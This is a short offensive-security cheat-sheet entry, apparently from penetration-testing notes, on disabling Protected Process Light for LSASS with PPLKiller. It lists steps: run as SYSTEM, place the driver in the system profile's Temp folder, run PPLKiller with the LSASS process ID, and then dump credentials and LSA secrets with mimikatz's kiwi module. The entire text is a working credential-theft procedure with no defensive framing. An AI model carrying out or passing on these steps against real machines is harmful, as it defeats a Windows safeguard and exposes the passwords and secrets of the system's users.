### Disable PPL using PPLKiller

- Make sure the session you are running with has SYSTEM privleges.'
- We need to upload the driver to the path: `C:\Windows\System32\config\systemprofile\AppData\Local\Temp` - The Temp directory might no exist, just create it - `mkdir Temp`.
- Then we will disable PPL: `.\PPLKiller.exe /disablePPL <LSASS PID>`
- Now we can use mimikatz to dump the lsass process: `load kiwi` - `creds_all` - `lsa_dump_secrets`.
